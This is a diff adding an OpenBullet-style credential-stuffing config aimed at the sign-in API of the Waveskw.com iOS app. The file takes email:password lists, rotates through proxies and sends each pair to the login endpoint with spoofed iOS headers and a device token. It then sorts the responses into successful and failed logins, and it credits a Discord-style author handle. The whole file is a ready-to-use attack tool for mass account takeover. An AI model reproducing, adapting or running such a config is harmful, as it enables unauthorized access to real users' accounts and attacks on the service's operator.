@@ -1,0 +1,61 @@
+[SETTINGS]
+{
+  "Name": "Waveskw.com",
+  "SuggestedBots": 150,
+  "MaxCPM": 0,
+  "LastModified": "2022-03-16T15:04:51.0714606+04:00",
+  "AdditionalInfo": "iOS App api | Captain checks orders In-app",
+  "RequiredPlugins": [],
+  "Author": "🔥 YASHVIRGAMING#7131 🔥",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://api.waveskw.com/api/auth/sign-in" 
+  CONTENT "{\"device_token\":\"fc082ab838b3ea5d27d5cc8d1048ce8a83563a32602b44d513fb2deac79de4d1\",\"email\":\"<USER>\",\"password\":\"<PASS>\",\"device_type\":\"iOS\",\"device_id\":\"fc082ab838b3ea5d27d5cc8d1048ce8a83563a32602b44d513fb2deac79de4d1\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: api.waveskw.com" 
+  HEADER "Accept: application/json" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Content-Length: 242" 
+  HEADER "User-Agent: WavesOwner/2.2 (com.dm.wavescaptain; build:1.0; iOS 15.3.1) Alamofire/5.2.2" 
+  HEADER "Accept-Language: en" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Connection: close" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "{\"success\":false" 
+    KEY "Password is incorrect." 
+    KEY "\"statusCode\":401" 
+    KEY "EMAIL_PASSWORD_INCORRECT" 
+  KEYCHAIN Success OR 
+    KEY "{\"success\":true" 
+    KEY "\"statusCode\":200" 
+
+FUNCTION Constant "🔥 YASHVIRGAMING#7131 🔥" -> CAP "Config By " 
+
